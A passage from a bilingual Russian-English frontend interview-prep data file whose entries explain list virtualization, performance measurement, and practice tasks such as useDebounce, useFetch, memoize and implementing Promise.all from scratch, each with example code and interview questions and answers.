            "import { useVirtualizer } from '@tanstack/react-virtual';\n\nfunction VirtualList({ items }) {\n  const parentRef = useRef(null);\n  const virtualizer = useVirtualizer({\n    count: items.length,\n    getScrollElement: () => parentRef.current,\n    estimateSize: () => 40, // примерная высота одного элемента\n  });\n\n  return (\n    <div ref={parentRef} style={{ height: 400, overflow: 'auto' }}>\n      <div style={{ height: virtualizer.getTotalSize(), position: 'relative' }}>\n        {virtualizer.getVirtualItems().map((virtualRow) => (\n          <div key={virtualRow.key} style={{ position: 'absolute', top: virtualRow.start, height: virtualRow.size }}>\n            {items[virtualRow.index].label}\n          </div>\n        ))}\n      </div>\n    </div>\n  );\n}",
          whereUsed:
            "Длинные списки и таблицы (тысячи строк логов, большие чаты, бесконечные ленты, автокомплиты с тысячами вариантов), где рендер всех элементов сразу заметно замедляет монтирование компонента и прокрутку.",
          interviewQuestion: "Какую реальную проблему решает виртуализация списков, и какую цену приходится платить за неё?",
          interviewAnswerRu:
            "Виртуализация решает проблему производительности при рендере очень длинных списков: без неё браузер должен создать, разместить и держать в памяти DOM-узлы для всех элементов сразу, даже если видно только малую часть, что заметно замедляет первый рендер и последующие обновления. Цена — усложнение кода (нужна библиотека или собственная реализация расчёта видимого диапазона), проблемы с переменной высотой элементов без заранее известных размеров, и потеря части нативного поведения браузера — например, Ctrl+F не найдёт текст в невидимых в данный момент элементах, потому что они физически отсутствуют в DOM, а не просто скрыты стилями.",
          interviewAnswerEn:
            "Virtualization solves the performance problem of rendering very long lists: without it, the browser has to create, lay out, and keep in memory DOM nodes for every item at once, even though only a small portion is visible, noticeably slowing the first render and subsequent updates. The cost is added code complexity (a library or a custom implementation for computing the visible range), trouble with variable-height items when sizes aren't known upfront, and losing some native browser behavior — for instance, Ctrl+F won't find text in currently invisible items, because they're physically absent from the DOM rather than just hidden by CSS.",
          pitfalls: [
            "Виртуализировать короткие списки (десятки элементов), где накладные расходы на саму виртуализацию превышают выгоду от неё.",
            "Не учитывать потерю нативного поиска по странице (Ctrl+F) и доступности (screen reader может не видеть элементы за пределами отрендеренного окна) при выборе виртуализации.",
          ],
        },
      },
      {
        id: "perf-measure-before-optimize",
        title: "Measure Before You Optimize",
        content: {
          title: "Measure Before You Optimize",
          shortExplanation:
            "Оптимизация без предварительного измерения — это в лучшем случае трата времени на то, что не было узким местом, а в худшем — усложнение кода без реального прироста производительности; правило 'сначала измерь' обязательно предшествует любой оптимизации.",
          detailedExplanation:
            "Интуиция о том, 'что должно быть медленным', часто ошибочна: разработчики нередко оптимизируют компонент, который субъективно выглядит 'тяжёлым' (много строк кода, сложная логика), в то время как реальным узким местом оказывается что-то незаметное — например, синхронный layout thrashing из-за чтения offsetHeight в цикле, или один медленный сторонний скрипт, блокирующий главный поток. Правильный процесс: сначала собрать данные (Lighthouse для лабораторных метрик, RUM/Core Web Vitals для полевых данных, Performance-панель или React Profiler для конкретного взаимодействия), затем на основе данных определить актуальное узкое место, внести точечное изменение, и затем измерить снова, чтобы подтвердить реальный эффект — а не просто 'выглядит быстрее'. Это же правило защищает от преждевременной оптимизации: мемоизация, виртуализация, ленивая загрузка — все они добавляют сложность коду, и вносить эту сложность стоит только там, где измерение подтвердило реальную проблему, а не 'на всякий случай' по всему приложению.",
          codeExample:
            "// Пример дисциплины 'измерить -> оптимизировать -> измерить снова':\n// 1. React Profiler показал: ProductList ре-рендерится 40 раз при вводе в поиск\n// 2. Гипотеза: onChange родителя создаёт новый объект пропсов каждый раз\n// 3. Точечное исправление: useMemo для объекта фильтра, React.memo для ProductList\n// 4. Повторный замер в Profiler: 40 рендеров -> 2 рендера — эффект подтверждён данными",
          whereUsed:
            "Любая работа над производительностью — от точечной жалобы 'форма лагает' до подготовки к масштабному редизайну — должна начинаться с этапа измерения, а не с 'очевидных' предположений о причине.",
          interviewQuestion: "Почему интуитивная догадка о причине медленной работы часто оказывается неверной, и как это проверить?",
          interviewAnswerRu:
            "Интуиция обычно ориентируется на видимую сложность кода (много строк, сложная бизнес-логика), но реальные узкие места производительности часто скрыты в менее очевидных местах — синхронных операциях с DOM в цикле, лишних сетевых запросах из-за отсутствия дедупликации, случайно потерянной мемоизации. Проверка — это профилирование конкретного взаимодействия (React DevTools Profiler для рендеров, Performance-панель для общей временной шкалы, Network-панель для запросов) до внесения изменений, чтобы увидеть, где реально тратится время, а не полагаться на предположение, а затем повторное профилирование после изменения, чтобы подтвердить, что оно действительно решило измеренную проблему.",
          interviewAnswerEn:
            "Intuition usually focuses on visible code complexity (lots of lines, complex business logic), but real performance bottlenecks are often hidden in less obvious places — synchronous DOM operations inside a loop, redundant network requests from missing deduplication, memoization accidentally lost somewhere. The check is profiling the actual interaction (React DevTools Profiler for renders, the Performance panel for the overall timeline, the Network panel for requests) before making any change, to see where time is actually being spent rather than relying on a guess, and then profiling again after the change to confirm it actually fixed the measured problem.",
          pitfalls: [
            "Оптимизировать 'на глаз', без профилирования, и тратить время на код, который не был реальной проблемой.",
            "Не проверять эффект оптимизации повторным измерением — изменение может не дать эффекта или даже ухудшить ситуацию, оставшись незамеченным.",
          ],
        },
      },

    ],
  },


  // ---------------------------------------------------------------------
  // PRACTICE TASKS
  // ---------------------------------------------------------------------
  {
    id: "practice-tasks",
    title: "Practice Tasks",
    subtopics: [
      {
        id: "practice-use-debounce",
        title: "useDebounce",
        content: {
          title: "useDebounce",
          shortExplanation:
            "Debounce откладывает выполнение функции, пока не пройдёт заданная пауза без новых вызовов — полезно для поиска по мере ввода текста.",
          detailedExplanation:
            "Классическая задача на понимание таймеров и хуков. useDebounce(value, delay) должен возвращать 'отложенную' версию значения: при каждом изменении value запускается новый таймер на delay миллисекунд, а предыдущий таймер отменяется. Только если пользователь перестал печатать на delay миллисекунд, хук вернёт новое значение — это снижает число сетевых запросов при поиске 'по мере ввода'.",
          codeExample:
            "function useDebounce<T>(value: T, delay: number): T {\n  const [debounced, setDebounced] = useState(value);\n  useEffect(() => {\n    const id = setTimeout(() => setDebounced(value), delay);\n    return () => clearTimeout(id);\n  }, [value, delay]);\n  return debounced;\n}",
          interviewQuestion: "Чем debounce отличается от throttle?",
          interviewAnswerRu:
            "Debounce откладывает вызов до тех пор, пока не наступит пауза нужной длины между событиями — если события идут непрерывно, вызова вообще не будет, пока поток не прервётся. Throttle, наоборот, гарантирует вызов не чаще, чем раз в N миллисекунд, независимо от того, продолжаются события или нет.",
          interviewAnswerEn:
            "Debounce delays the call until there's been a pause of the required length between events — if events keep firing continuously, the call never happens until the stream stops. Throttle, in contrast, guarantees a call at most once every N milliseconds, regardless of whether events keep coming or not.",
          pitfalls: [
            "Забывать очищать предыдущий таймер (clearTimeout) — накапливаются лишние отложенные вызовы.",
            "Дебаунсить сам обработчик события вместо значения — усложняет тестирование и переиспользование.",
          ],
          practiceTask:
            "Реализуйте поле поиска, которое делает 'запрос' (например, console.log) только через 400мс после того, как пользователь прекратил печатать.",
          resources: {
            docs: [
              { title: "useDebounceValue — usehooks-ts", url: "https://usehooks-ts.com/react-hook/use-debounce-value" },
            ],
            articles: [
              { title: "Debouncing and Throttling Explained Through Examples — CSS-Tricks", url: "https://css-tricks.com/debouncing-throttling-explained-examples/" },
            ],
          },
        },
      },
      {
        id: "practice-use-throttle",
        title: "useThrottle",
        content: {
          title: "useThrottle",
          shortExplanation:
            "Throttle гарантирует, что функция вызывается не чаще одного раза за заданный интервал, независимо от частоты событий.",
          detailedExplanation:
            "Полезно для событий, которые срабатывают очень часто (scroll, resize, mousemove), когда обрабатывать каждое событие дорого, но и полностью откладывать реакцию (как в debounce) нежелательно — пользователю нужна обратная связь 'по ходу' действия, просто не на каждый пиксель. Реализация обычно хранит 'последний вызов был в момент X' и игнорирует новые вызовы, пока не пройдёт интервал.",
          codeExample:
            "function useThrottle<T>(value: T, interval: number): T {\n  const [throttled, setThrottled] = useState(value);\n  const lastRan = useRef(Date.now());\n  useEffect(() => {\n    const id = setTimeout(() => {\n      if (Date.now() - lastRan.current >= interval) {\n        setThrottled(value);\n        lastRan.current = Date.now();\n      }\n    }, interval - (Date.now() - lastRan.current));\n    return () => clearTimeout(id);\n  }, [value, interval]);\n  return throttled;\n}",
          interviewQuestion: "Какой случай использования лучше подходит для throttle, а не debounce?",
          interviewAnswerRu:
            "Обработка скролла для показа/скрытия шапки сайта или подгрузки контента при бесконечном скролле — здесь нужна регулярная, но не слишком частая реакция во время самого процесса скролла. Debounce в этом случае сработал бы только после того, как пользователь перестал скроллить, что не подходит для 'живой' реакции интерфейса.",
          interviewAnswerEn:
            "Handling scroll to show/hide a sticky header or to load more content for infinite scroll — this needs a regular but not too-frequent reaction while scrolling is actually happening. Debounce would only fire after the user stops scrolling, which doesn't work for a 'live' interface reaction.",
          pitfalls: [
            "Использовать throttle там, где на самом деле нужен debounce (например, для инпута поиска) — интерфейс будет делать лишние запросы.",
            "Забывать про 'последний' пропущенный вызов в конце серии событий — иногда нужно гарантированно обработать финальное значение.",
          ],
          practiceTask:
            "Реализуйте индикатор прогресса чтения статьи, который обновляется по scroll не чаще раза в 100мс.",
          resources: {
            docs: [
              { title: "useDebounceValue — usehooks-ts", url: "https://usehooks-ts.com/react-hook/use-debounce-value" },
            ],
            articles: [
              { title: "Debouncing and Throttling Explained Through Examples — CSS-Tricks", url: "https://css-tricks.com/debouncing-throttling-explained-examples/" },
            ],
          },
        },
      },
      {
        id: "practice-use-local-storage",
        title: "useLocalStorage",
        content: {
          title: "useLocalStorage",
          shortExplanation:
            "Хук, который синхронизирует React state с localStorage: читает значение при инициализации и сохраняет его при каждом изменении.",
          detailedExplanation:
            "Задача проверяет понимание работы с побочными эффектами, сериализации (JSON.stringify/parse) и обработки ошибок (localStorage может быть недоступен, значение — повреждённым JSON). Хорошая реализация лениво читает начальное значение (через функцию в useState, а не при каждом рендере), безопасно обрабатывает JSON.parse, и оборачивает setter, чтобы одновременно обновлять state и localStorage.",
          codeExample:
            "function useLocalStorage<T>(key: string, initialValue: T) {\n  const [value, setValue] = useState<T>(() => {\n    try {\n      const item = window.localStorage.getItem(key);\n      return item ? (JSON.parse(item) as T) : initialValue;\n    } catch {\n      return initialValue;\n    }\n  });\n\n  useEffect(() => {\n    window.localStorage.setItem(key, JSON.stringify(value));\n  }, [key, value]);\n\n  return [value, setValue] as const;\n}",
          interviewQuestion: "Почему начальное значение из localStorage лучше читать через функцию в useState, а не напрямую?",
          interviewAnswerRu:
            "useState(() => computeInitial()) — 'ленивая инициализация' — вызывает функцию только один раз, при первом рендере. Если написать useState(computeInitial()), выражение computeInitial() будет вычисляться при каждом рендере компонента (хотя результат используется только в первом), что означает лишнее обращение к localStorage и JSON.parse на каждый ре-рендер.",
          interviewAnswerEn:
            "useState(() => computeInitial()) — lazy initialization — calls the function only once, on the first render. Writing useState(computeInitial()) instead means computeInitial() gets evaluated on every render of the component (even though the result is only used on the first one), causing an unnecessary localStorage read and JSON.parse on every re-render.",
          pitfalls: [
            "Не оборачивать JSON.parse в try/catch — повреждённые данные в localStorage уронят приложение.",
            "Читать localStorage без проверки typeof window !== 'undefined' в SSR-окружении (Next.js).",
          ],
          practiceTask:
            "Используйте useLocalStorage для сохранения выбранной темы (light/dark) и проверьте, что значение переживает перезагрузку страницы.",
          resources: {
            docs: [
              { title: "Window: localStorage — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" },
            ],
            articles: [
              { title: "useLocalStorage — usehooks-ts", url: "https://usehooks-ts.com/react-hook/use-local-storage" },
            ],
          },
        },
      },
      {
        id: "practice-use-fetch",
        title: "useFetch",
        content: {
          title: "useFetch",
          shortExplanation:
            "Простой хук для загрузки данных с сервера с состояниями loading/error/data — учебный аналог того, что решают библиотеки вроде TanStack Query.",
          detailedExplanation:
            "Задача помогает понять, из чего 'состоит' любая библиотека для работы с данными: нужно отслеживать три состояния (загрузка, ошибка, данные), корректно обрабатывать отмену запроса при размонтировании компонента или смене url (через AbortController), и избегать race condition — если url поменялся до того, как пришёл первый ответ, нужно проигнорировать устаревший ответ.",
          codeExample:
            "function useFetch<T>(url: string) {\n  const [state, setState] = useState<{ data: T | null; error: string | null; loading: boolean }>(\n    { data: null, error: null, loading: true }\n  );\n\n  useEffect(() => {\n    const controller = new AbortController();\n    setState(s => ({ ...s, loading: true }));\n\n    fetch(url, { signal: controller.signal })\n      .then(res => res.json())\n      .then(data => setState({ data, error: null, loading: false }))\n      .catch(err => {\n        if (err.name !== 'AbortError') {\n          setState({ data: null, error: err.message, loading: false });\n        }\n      });\n\n    return () => controller.abort();\n  }, [url]);\n\n  return state;\n}",
          interviewQuestion: "Как этот хук защищается от race condition при быстрой смене url?",
          interviewAnswerRu:
            "Через AbortController: при каждом изменении url useEffect сначала создаёт новый controller, а функция очистки предыдущего эффекта вызывает controller.abort() для отменённого запроса. Это не только экономит сеть, но и гарантирует, что устаревший ответ (например, от старого поискового запроса) не перезапишет более новые данные в state.",
          interviewAnswerEn:
            "Via AbortController: each time url changes, the effect creates a new controller, and the cleanup function of the previous effect calls controller.abort() on the outdated request. This not only saves bandwidth but also guarantees that a stale response (say, from an earlier search query) can't overwrite newer data in state.",
          pitfalls: [
            "Не отменять предыдущий запрос при смене url — race condition может показать устаревшие данные как актуальные.",
            "Забывать проверять err.name === 'AbortError', из-за чего отменённый запрос ошибочно показывается как реальная ошибка.",
          ],
          practiceTask:
            "Постройте инпут поиска, который дергает useFetch(`/api/search?q=${query}`) при каждом изменении query, и убедитесь, что быстрые повторные вводы не приводят к 'миганию' старых результатов.",
          resources: {
            docs: [
              { title: "AbortController — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/API/AbortController" },
            ],
            articles: [
              { title: "Using Promises — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises" },
            ],
          },
        },
      },
      {
        id: "practice-promise-all",
        title: "Promise.all",
        content: {
          title: "Promise.all",
          shortExplanation:
            "Promise.all запускает несколько промисов параллельно и ждёт, пока выполнятся все — если хотя бы один отклонится, весь Promise.all сразу отклоняется.",
          detailedExplanation:
            "Это одна из базовых задач на понимание асинхронности в JS. Важно понимать разницу с последовательным await в цикле: await в цикле выполняет запросы один за другим (медленнее, если они независимы), а Promise.all запускает их все сразу и ждёт самого медленного. Также стоит знать Promise.allSettled — аналог, который не 'падает' при первой ошибке, а возвращает результат по каждому промису (fulfilled или rejected).",
          codeExample:
            "// Последовательно — медленно, если запросы независимы\nconst user = await fetchUser(id);\nconst posts = await fetchPosts(id);\n\n// Параллельно — быстрее, оба запроса идут одновременно\nconst [user, posts] = await Promise.all([fetchUser(id), fetchPosts(id)]);",
          interviewQuestion: "Что произойдёт с Promise.all, если один из промисов отклонится, а остальные ещё выполняются?",
          interviewAnswerRu:
            "Promise.all сразу отклонится с причиной (reason) первого упавшего промиса, не дожидаясь остальных. Остальные промисы при этом продолжат выполняться в фоне (их нельзя 'отменить' самим Promise.all), но их результат уже никак не повлияет на итоговый результат Promise.all. Если нужно дождаться всех независимо от исхода каждого — используется Promise.allSettled.",
          interviewAnswerEn:
            "Promise.all immediately rejects with the reason of the first promise that fails, without waiting for the others. The other promises keep running in the background regardless (Promise.all itself can't cancel them), but their outcome no longer affects the overall Promise.all result. If you need to wait for all of them regardless of individual outcomes, use Promise.allSettled instead.",
          pitfalls: [
            "Использовать await в цикле для независимых запросов, теряя параллелизм без необходимости.",
            "Не обрабатывать частичный провал — если нужен результат по каждому запросу отдельно, Promise.all не подходит.",
          ],
          practiceTask:
            "Напишите функцию, которая параллельно загружает данные трёх пользователей по id через Promise.all, и отдельно — версию через Promise.allSettled, которая не падает, если один id некорректен.",
          resources: {
            docs: [
              { title: "Using Promises — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Using_promises" },
            ],
            articles: [
              { title: "Promise API — javascript.info", url: "https://javascript.info/promise-api" },
            ],
          },
        },
      },
      {
        id: "practice-deep-clone",
        title: "deepClone",
        content: {
          title: "deepClone",
          shortExplanation:
            "Глубокое клонирование создаёт полностью независимую копию объекта/массива, включая все вложенные структуры, а не просто копию верхнего уровня.",
          detailedExplanation:
            "Обычное присваивание ({ ...obj } или Object.assign) копирует только верхний уровень (shallow copy) — вложенные объекты и массивы остаются общими ссылками между оригиналом и копией. Задача deepClone проверяет умение рекурсивно обходить структуру данных, обрабатывать массивы, объекты, примитивы отдельно, и (в сложных версиях) специальные типы вроде Date, Map, Set, а также циклические ссылки.",
          codeExample:
            "function deepClone<T>(value: T, seen = new WeakMap()): T {\n  if (value === null || typeof value !== 'object') return value;\n  if (seen.has(value as object)) return seen.get(value as object);\n\n  const result: any = Array.isArray(value) ? [] : {};\n  seen.set(value as object, result);\n\n  for (const key in value) {\n    result[key] = deepClone((value as any)[key], seen);\n  }\n  return result;\n}",
          interviewQuestion: "Почему structuredClone (встроенный в браузеры) часто предпочтительнее самописного deepClone?",
          interviewAnswerRu:
            "structuredClone реализован на уровне движка и правильно обрабатывает Date, Map, Set, циклические ссылки, TypedArray и многие другие случаи 'из коробки', тогда как самописная рекурсивная реализация обычно покрывает только простые объекты и массивы и может сломаться на edge cases. Самописный deepClone стоит писать в первую очередь как учебное упражнение на рекурсию, а не как продакшн-решение.",
          interviewAnswerEn:
            "structuredClone is implemented at the engine level and correctly handles Date, Map, Set, circular references, TypedArrays, and many other cases out of the box, whereas a hand-rolled recursive implementation usually only covers plain objects and arrays and can break on edge cases. A hand-written deepClone is best treated as a recursion learning exercise rather than a production solution.",
          pitfalls: [
            "Забывать обработку циклических ссылок — рекурсия уходит в бесконечность или падает со stack overflow.",
            "Не различать массив и объект при создании результата — теряется тип структуры.",
          ],
          practiceTask:
            "Расширьте deepClone из примера так, чтобы он отдельно обрабатывал значения типа Date (клонировал как новый Date, а не как обычный объект).",
          resources: {
            docs: [
              { title: "Window: structuredClone() — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/API/Window/structuredClone" },
            ],
            articles: [
              { title: "Deep-copying in JavaScript using structuredClone — web.dev", url: "https://web.dev/articles/structured-clone" },
            ],
          },
        },
      },
      {
        id: "practice-group-by",
        title: "groupBy",
        content: {
          title: "groupBy",
          shortExplanation:
            "groupBy группирует элементы массива в объект по ключу, вычисляемому из каждого элемента — например, список заказов по статусу.",
          detailedExplanation:
            "Классическая задача на работу с reduce и типами (generics). Функция принимает массив и функцию получения ключа для каждого элемента, а возвращает объект, где каждый ключ — это одно из значений, а значение — массив элементов с этим ключом. Полезна на практике при подготовке данных для UI: сгруппировать задачи по статусу, заказы по дате, товары по категории.",
          codeExample:
            "function groupBy<T, K extends string | number>(\n  items: T[],\n  getKey: (item: T) => K\n): Record<K, T[]> {\n  return items.reduce((acc, item) => {\n    const key = getKey(item);\n    (acc[key] ??= []).push(item);\n    return acc;\n  }, {} as Record<K, T[]>);\n}\n\ngroupBy(orders, (o) => o.status);\n// { pending: [...], done: [...] }",
          interviewQuestion: "Как обобщить groupBy через generics, чтобы TypeScript правильно выводил тип результата?",
          interviewAnswerRu:
            "Нужно два типовых параметра: T — тип элементов массива, и K extends string | number — тип ключа группировки (ограничение нужно, потому что ключи объекта в JS/TS — это строки или числа). Тогда getKey: (item: T) => K, а возвращаемый тип — Record<K, T[]>. TypeScript выведет K автоматически из того, что реально возвращает функция getKey в месте вызова.",
          interviewAnswerEn:
            "You need two type parameters: T for the array's element type, and K extends string | number for the grouping key type (the constraint is needed because object keys in JS/TS must be strings or numbers). Then getKey: (item: T) => K, and the return type is Record<K, T[]>. TypeScript infers K automatically from whatever getKey actually returns at the call site.",
          pitfalls: [
            "Не ограничивать K типом string | number — TypeScript не даст использовать произвольный тип как ключ объекта.",
            "Мутировать исходный массив вместо создания нового объекта группировки.",
          ],
          practiceTask:
            "Сгруппируйте список пользователей по первой букве имени и по возрастной группе (например, '18-25', '26-35') с помощью одной функции groupBy.",
          resources: {
            docs: [
              { title: "Object.groupBy() — MDN", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/groupBy" },
            ],
            articles: [
              { title: "Lodash groupBy docs", url: "https://lodash.com/docs/4.17.15#groupBy" },
            ],
          },
        },
      },
      {
        id: "practice-memoize",
        title: "memoize",
        content: {
          title: "memoize",
          shortExplanation:
            "memoize — функция высшего порядка, которая кэширует результат вызова другой функции по её аргументам, чтобы не пересчитывать одно и то же дважды.",
          detailedExplanation:
            "Простая реализация хранит Map, где ключ — сериализованные аргументы (например, JSON.stringify(args)), а значение — результат вызова. При повторном вызове с теми же аргументами функция не выполняется заново, а сразу возвращается закэшированный результат. Ограничения простого подхода: сериализация аргументов через JSON.stringify не работает для функций, Map/Set, циклических структур, а кэш растёт бесконечно без стратегии вытеснения (LRU и т.п.).",
          codeExample:
            "function memoize<Args extends unknown[], R>(fn: (...args: Args) => R) {\n  const cache = new Map<string, R>();\n  return (...args: Args): R => {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key)!;\n    const result = fn(...args);\n    cache.set(key, result);\n    return result;\n  };\n}\n\nconst slowSquare = (n: number) => { /* тяжёлое вычисление */ return n * n; };\nconst fastSquare = memoize(slowSquare);",
          interviewQuestion: "В чём разница между memoize (обычная функция) и useMemo (React hook)?",
          interviewAnswerRu:
            "memoize — это универсальная техника кэширования результата чистой функции по её аргументам, живёт вне React и кэш существует, пока существует замыкание. useMemo — React-специфичный хук, который кэширует значение между рендерами одного конкретного компонента и пересчитывает его, когда меняются переданные зависимости; кэш живёт вместе с компонентом и очищается при его размонтировании.",
          interviewAnswerEn:
            "memoize is a general-purpose technique for caching a pure function's result by its arguments; it lives outside React and its cache persists as long as the closure exists. useMemo is a React-specific hook that caches a value across renders of one particular component and recomputes it when the given dependencies change; its cache lives with the component and is cleared when it unmounts.",
          pitfalls: [
            "Мемоизировать функции с побочными эффектами или недетерминированным результатом — кэш вернёт неправильный результат.",
            "Не ограничивать размер кэша — при большом количестве уникальных аргументов растёт утечка памяти.",
          ],
          practiceTask:
            "Замерьте время выполнения тяжёлой рекурсивной функции (например, наивный fibonacci) до и после memoize при повторных одинаковых вызовах.",
          resources: {
            docs: [
              { title: "Memoization — MDN Glossary", url: "https://developer.mozilla.org/en-US/docs/Glossary/Memoization" },
            ],
            articles: [
              { title: "Understanding useMemo and useCallback — Josh W. Comeau", url: "https://www.joshwcomeau.com/react/usememo-and-usecallback/" },
            ],
          },
        },
      },
      {
        id: "practice-sum-curried",
        title: "sum(...args) / curried sum",
        content: {
          title: "sum(...args) / curried sum",
          shortExplanation:
            "Классическая задача на понимание rest-параметров, замыканий и (в усложнённой версии) каррирования: функция должна уметь суммировать как sum(1, 2, 3), так и sum(1)(2)(3), возвращая число только при явном приведении к примитиву или вызове без аргументов.",
          detailedExplanation:
            "Простая версия — sum(...args) — тривиальна через rest-параметры и reduce. Усложнённая версия (каррированный sum, поддерживающий sum(1)(2)(3)) требует, чтобы каждый вызов возвращал функцию, которая либо принимает следующий аргумент, либо (при вызове без аргументов или через valueOf/toString) возвращает накопленную сумму — это требует замыкания, хранящего накопленный итог между вызовами, и переопределения valueOf, чтобы sum(1)(2)(3) + 0 или console.log(String(sum(1)(2)(3))) работали корректно.",
          codeExample:
            "// Простая версия\nfunction sum(...args) {\n  return args.reduce((acc, n) => acc + n, 0);\n}\n\n// Каррированная версия: sum(1)(2)(3) === 6\nfunction sum(a) {\n  let total = a;\n  function inner(b) {\n    total += b;\n    return inner;\n  }\n  inner.valueOf = () => total;\n  return inner;\n}\nconsole.log(+sum(1)(2)(3)); // 6",
          whereUsed:
            "Частая задача на живом кодинге для проверки понимания замыканий и rest-параметров, а также — в усложнённой версии — знания механизма приведения объектов к примитиву (valueOf/Symbol.toPrimitive).",
          interviewQuestion: "Как каррированная версия sum(1)(2)(3) 'узнаёт', когда пора вернуть число, а не очередную функцию?",
          interviewAnswerRu:
            "Формально она не 'узнаёт' заранее — каждый вызов всегда возвращает функцию с обновлённым замыканием, хранящим накопленную сумму. Хитрость в том, что мы переопределяем valueOf (или Symbol.toPrimitive) у этой возвращаемой функции — тогда, когда JS движок пытается привести результат к примитиву (например, при console.log(+sum(1)(2)(3)) или в шаблонной строке), он вызывает valueOf и получает число вместо функции.",
          interviewAnswerEn:
            "Formally, it doesn't 'know' in advance — every call always returns a function with an updated closure holding the running total. The trick is overriding valueOf (or Symbol.toPrimitive) on that returned function — so when the JS engine tries to coerce the result to a primitive (say, in console.log(+sum(1)(2)(3)) or a template string), it calls valueOf and gets a number instead of a function.",
          pitfalls: [
            "Забыть, что без переопределения valueOf/toString результат каррированного sum останется функцией, а не числом, при обычном выводе.",
            "Не обнулять накопленную сумму между независимыми цепочками вызовов sum(...) — каждый вызов sum(a) должен начинать новое замыкание.",
          ],
          practiceTask:
            "Реализуйте функцию sum, которая работает и как sum(1, 2, 3) === 6, и как sum(1)(2)(3) === 6 (при явном приведении к числу).",
        },
      },
      {
        id: "practice-accumulate-closure",
        title: "accumulate() через замыкание",
        content: {
          title: "accumulate() через замыкание",
          shortExplanation:
            "Задача на замыкания: функция-фабрика создаёт 'аккумулятор', который при каждом вызове добавляет новое значение к внутреннему состоянию и возвращает текущую сумму (или массив всех значений) — состояние хранится в переменной внешней функции, недоступной снаружи напрямую.",
          detailedExplanation:
            "Ключевая идея — замыкание (closure): внутренняя функция 'запоминает' переменную из внешней функции даже после того, как внешняя функция завершила выполнение, и эта переменная не имеет глобальной области видимости — единственный способ её изменить — вызвать саму возвращённую функцию. Это классический способ реализовать приватное состояние в JS без классов и без использования модулей — каждый вызов фабрики (makeAccumulator()) создаёт независимый набор переменных в своём собственном замыкании, поэтому два разных аккумулятора не делят состояние между собой.",
          codeExample:
            "function makeAccumulator() {\n  let total = 0;\n  return function (value) {\n    total += value;\n    return total;\n  };\n}\n\nconst acc = makeAccumulator();\nacc(5); // 5\nacc(10); // 15\n\nconst acc2 = makeAccumulator();\nacc2(100); // 100 — независимое состояние",
          whereUsed:
            "Проверка понимания замыканий на собеседовании, реализация приватного инкапсулированного состояния без классов (счётчики, аккумуляторы событий, простые кэши).",
          interviewQuestion: "Почему два вызова makeAccumulator() создают независимые аккумуляторы, а не делят одно и то же состояние?",
          interviewAnswerRu:
            "Каждый вызов makeAccumulator() создаёт новое выполнение функции, а значит — новую переменную total в своём собственном контексте выполнения (execution context), и возвращаемая внутренняя функция замыкается именно на эту конкретную переменную, а не на 'total вообще'. Поэтому acc и acc2 из разных вызовов makeAccumulator() ссылаются на два разных, независимых total в памяти, хотя код внутри функции идентичен для обоих.",
          interviewAnswerEn:
            "Each call to makeAccumulator() creates a new function execution, and therefore a new total variable in its own execution context, and the returned inner function closes over that specific variable, not over 'total in general.' So acc and acc2 from separate calls to makeAccumulator() reference two distinct, independent total variables in memory, even though the code inside the function is identical for both.",
          pitfalls: [
            "Ожидать, что все вызовы makeAccumulator() будут делить одно общее состояние — на самом деле каждый вызов создаёт независимое замыкание.",
            "Путать замыкание с копированием значения — переменная total не копируется в функцию, а именно 'запоминается по ссылке' на конкретный контекст выполнения.",
          ],
          practiceTask:
            "Реализуйте makeAccumulator(), которая возвращает функцию; каждый вызов этой функции с числом добавляет его к внутренней сумме и возвращает текущий итог.",
        },
      },
      {
        id: "practice-implement-promise-all",
        title: "Реализовать Promise.all с нуля",
        content: {
          title: "Реализовать Promise.all с нуля",
          shortExplanation:
            "Классическая продвинутая задача: написать функцию myPromiseAll(promises), которая ведёт себя как встроенный Promise.all — резолвится массивом результатов в исходном порядке, как только резолвятся все промисы, и сразу реджектится, если хотя бы один из них упал.",
          detailedExplanation:
            "Главная сложность — сохранить порядок результатов, несмотря на то что промисы могут резолвиться в произвольном порядке: решение — заранее создать массив результатов нужной длины и записывать каждый результат по его исходному индексу (через .then с замыканием на index), а не просто пушить в массив по мере прихода ответов. Нужно вручную отслеживать количество уже резолвленных промисов (счётчик) и вызывать resolve() итогового промиса только тогда, когда счётчик сравняется с общим количеством переданных промисов — а не при первом же резолвленном элементе. Реджект должен происходить немедленно при первой ошибке (вызовом reject() внешнего промиса), не дожидаясь остальных — как и в оригинальном Promise.all. Отдельно стоит подумать про edge case пустого массива (должен сразу резолвиться пустым массивом) и про то, что элементы массива не обязаны быть промисами — обычные значения нужно оборачивать в Promise.resolve или просто трактовать как уже готовый результат.",
          codeExample:
            "function myPromiseAll(promises) {\n  return new Promise((resolve, reject) => {\n    if (promises.length === 0) return resolve([]);\n    const results = new Array(promises.length);\n    let completed = 0;\n    promises.forEach((p, index) => {\n      Promise.resolve(p)\n        .then((value) => {\n          results[index] = value;\n          completed += 1;\n          if (completed === promises.length) resolve(results);\n        })\n        .catch(reject);\n    });\n  });\n}",
          whereUsed:
            "Частый вопрос на senior-собеседованиях для проверки глубокого понимания промисов (а не просто умения их использовать) — аналогичные задачи существуют и для Promise.race, Promise.allSettled, Promise.any.",
          interviewQuestion: "Почему в реализации myPromiseAll нельзя просто делать results.push(value) в каждом .then вместо записи по индексу?",
          interviewAnswerRu:
            "Промисы могут резолвиться в произвольном порядке, не совпадающем с порядком их передачи в массив — например, второй промис может выполниться быстрее первого. Если использовать push, результаты окажутся в массиве в порядке фактического завершения, а не в порядке исходных промисов, что нарушает контракт Promise.all, который гарантирует порядок результатов, соответствующий порядку входных промисов, независимо от того, в каком порядке они реально резолвились.",
          interviewAnswerEn:
            "Promises can resolve in an arbitrary order that doesn't match the order they were passed in — for instance, the second promise might finish before the first. Using push would put results into the array in the order they actually completed, not in the order of the original promises, breaking Promise.all's contract, which guarantees the result order matches the input order regardless of the actual resolution order.",
          pitfalls: [
            "Записывать результаты через push вместо записи по исходному индексу — ломает гарантированный порядок результатов.",
            "Забыть обработать пустой входной массив как отдельный edge case, для которого промис должен резолвиться сразу пустым массивом.",
          ],
          practiceTask:
